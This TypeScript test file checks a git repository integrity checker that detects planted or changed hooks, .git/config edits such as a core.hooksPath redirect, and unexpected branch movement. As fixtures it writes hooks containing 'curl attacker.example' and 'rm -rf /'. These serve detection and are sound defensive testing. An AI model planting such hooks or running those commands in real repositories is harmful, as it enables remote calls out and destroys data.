import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

// integrity.ts resolves its baseline dir from DATA_DIR at import time.
const testDataDir = fs.mkdtempSync(path.join(os.tmpdir(), "radulf-integrity-"));
process.env.RADULF_DATA_DIR = path.join(testDataDir, "data");
const {
  snapshotRepoIntegrity,
  checkRepoIntegrity,
  saveBaseline,
  loadBaseline,
  removeBaseline,
} = await import("./integrity");

function git(dir: string, ...args: string[]) {
  return execFileSync("git", ["-C", dir, ...args], { encoding: "utf8" }).trim();
}

const RUN_BRANCH = "ralph/test-card-run1";
let repo: string;

beforeAll(() => {
  repo = fs.mkdtempSync(path.join(os.tmpdir(), "radulf-integrity-repo-"));
  git(repo, "init", "-b", "main");
  git(repo, "config", "user.email", "t@t.t");
  git(repo, "config", "user.name", "T");
  fs.writeFileSync(path.join(repo, "README.md"), "# repo");
  git(repo, "add", ".");
  git(repo, "commit", "-m", "initial");
  git(repo, "branch", RUN_BRANCH);
});

afterAll(() => {
  fs.rmSync(repo, { recursive: true, force: true });
  fs.rmSync(testDataDir, { recursive: true, force: true });
  delete process.env.RADULF_AUTH_SECRET;
  delete process.env.RADULF_DATA_DIR;
});

describe("repo integrity check (spec 14 L3 1g)", () => {
  it("passes when nothing changed", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    expect(baseline).not.toBeNull();
    expect(
      await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
    ).toEqual([]);
  });

  it("returns null for a path that is not a git repo", async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "radulf-notrepo-"));
    try {
      expect(await snapshotRepoIntegrity(dir)).toBeNull();
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it("catches a planted .git/hooks/pre-commit", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    const hook = path.join(repo, ".git", "hooks", "pre-commit");
    fs.writeFileSync(hook, "#!/bin/sh\ncurl attacker.example\n");
    try {
      const violations = await checkRepoIntegrity(repo, baseline, {
        runBranch: RUN_BRANCH,
        checkRefs: true,
      });
      expect(violations).toEqual(["hook appeared: .git/hooks/pre-commit"]);
    } finally {
      fs.rmSync(hook, { force: true });
    }
  });

  it("catches a modified hook that existed at baseline", async () => {
    const hook = path.join(repo, ".git", "hooks", "post-merge");
    fs.writeFileSync(hook, "#!/bin/sh\necho legit\n");
    const baseline = (await snapshotRepoIntegrity(repo))!;
    fs.writeFileSync(hook, "#!/bin/sh\necho evil\n");
    try {
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
      ).toEqual(["hook changed: .git/hooks/post-merge"]);
    } finally {
      fs.rmSync(hook, { force: true });
    }
  });

  it("catches a .git/config change (e.g. core.hooksPath redirection)", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    git(repo, "config", "core.hooksPath", "/tmp/evil-hooks");
    try {
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
      ).toEqual([".git/config changed"]);
    } finally {
      git(repo, "config", "--unset", "core.hooksPath");
    }
  });

  it("allows the run's own branch to move but catches any other ref", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    // The run's own branch moving is legitimate loop work.
    git(repo, "update-ref", `refs/heads/${RUN_BRANCH}`, "HEAD");
    fs.writeFileSync(path.join(repo, "new.txt"), "x");
    git(repo, "add", ".");
    git(repo, "commit", "-m", "moves main");
    try {
      const violations = await checkRepoIntegrity(repo, baseline, {
        runBranch: RUN_BRANCH,
        checkRefs: true,
      });
      expect(violations).toHaveLength(1);
      expect(violations[0]).toMatch(/^ref moved: refs\/heads\/main /);
      // The pre-merge variant deliberately ignores ref movement.
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: false }),
      ).toEqual([]);
    } finally {
      git(repo, "reset", "--hard", "HEAD~1");
    }
  });

  it("catches a hook planted AFTER a clean run-end check, at the pre-merge re-check", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    // Run-end check passes…
    expect(
      await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
    ).toEqual([]);
    // …then a surviving process plants a hook while the card sits in review.
    const hook = path.join(repo, ".git", "hooks", "post-merge");
    fs.writeFileSync(hook, "#!/bin/sh\nrm -rf /\n");
    try {
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: false }),
      ).toEqual(["hook appeared: .git/hooks/post-merge"]);
    } finally {
      fs.rmSync(hook, { force: true });
    }
  });

  it("persists baselines per run for the pre-merge re-check", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    saveBaseline("run-abc", baseline);
    expect(loadBaseline("run-abc")).toEqual(baseline);
    removeBaseline("run-abc");
    expect(loadBaseline("run-abc")).toBeNull();
  });
});
